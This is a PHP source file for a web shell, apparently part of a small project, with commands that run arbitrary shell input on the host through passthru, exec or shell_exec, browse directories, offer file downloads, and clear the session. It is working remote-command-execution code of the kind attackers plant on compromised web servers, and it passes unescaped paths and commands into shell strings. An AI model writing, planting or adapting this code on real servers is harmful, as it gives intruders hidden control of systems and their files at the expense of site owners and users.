<?php
namespace ishibashiTokyo;

class Commands
{
    protected function Cmd_clear()
    {
        $_SESSION['webshell']['history'] = array();
    }

    protected function Cmd_delete()
    {
        $_SESSION = array();
        if (isset($_COOKIE["PHPSESSID"])) {
            setcookie("PHPSESSID", '', time() - 1800, '/');
        }
        session_destroy();
        // echo __DIR__;
        if(substr(__DIR__, 0, 7) === 'phar://') {
            echo 'this Phar.';
            // @todo realpathを通してもうまくパスが取得できない
        }
        else {
            echo 'this shell.php';
            echo realpath(__DIR__ . '/../');
        }
        exit();
    }

    protected function Cmd_cd($cmd)
    {
        $cmd_array = explode(' ', $cmd);

        // 引数なしの場合はカレントディレクトリをリセット
        if (! isset($cmd_array[1])) {
            $_SESSION['webshell']['path'] = realpath('./');
            return;
        }

        // '/'始まりのパスはそのまま格納
        if (substr($cmd_array[1], 0, 1) === '/') {
            $_SESSION['webshell']['path'] = realpath($cmd_array[1]);
            return;
        }

        $_SESSION['webshell']['path'] = realpath($_SESSION['webshell']['path'] . '/' . $cmd_array[1]);
    }

    protected function Cmd_ll($cmd)
    {
        // ls対象のディレクトリを特定
        $cmd_array = explode(' ', $cmd);
        $_path = $_SESSION['webshell']['path'];

        // パスの引数が存在する場合
        if (isset($cmd_array[1])) {
            // '/'始まりの場合
            if (substr($cmd_array[1], 0, 1) === '/') {
                $_path = realpath($cmd_array[1]);
            }
            // 相対パスの場合
            else {
                $_path = realpath($_SESSION['webshell']['path'] . '/' . $cmd_array[1]);
            }
        }

        $exec_cmd = sprintf('cd %s ; ls -la', $_path);
        $_resulet = mb_convert_encoding(shell_exec($exec_cmd), 'UTF-8');

        $files = array_filter(glob($_path . '/' . "*.*"), 'is_file');
        $files = array_map('basename', $files);

        $files_pattern = array();
        $replacement = array();
        foreach ($files as $file) {
            $files_pattern[] = '/\s' . $file . '/';
            $replacement[] = sprintf(
                ' <a href="?download=%s">%s</a>',
                urlencode($_path . '/' . $file),
                $file
            );
        }

        return preg_replace($files_pattern, $replacement, $_resulet);
    }

    protected function Cmd_exec($cmd)
    {
        $exec_cmd = sprintf('cd %s ; %s 2>&1', $_SESSION['webshell']['path'], $cmd);

        if (strpos($cmd, '>') !== false) {
            $exec_cmd = sprintf('cd %s ; %s', $_SESSION['webshell']['path'], $cmd);
        }

        $_executed = false;
        if(function_exists('passthru') && ! $_executed) {
            ob_start();
            passthru($exec_cmd);
            $_resulet = ob_get_contents();
            ob_end_clean();
            $_executed = true;
        }

        if(function_exists('exec') && ! $_executed) {
            exec($exec_cmd, $_exec_result);
            $_resulet = implode("\n", $_exec_result);
            $_executed = true;
        }

        if(function_exists('shell_exec') && ! $_executed) {
            $_resulet = shell_exec($exec_cmd);
            $_executed = true;
        }

        if(! $_executed) {
            return 'Error: Function undefined. (passthru, exec, shell_exec)' . PHP_EOL;
        }

        $_resulet = mb_convert_encoding($_resulet, 'UTF-8');

        return htmlspecialchars($_resulet, ENT_QUOTES, 'UTF-8', true);
    }
}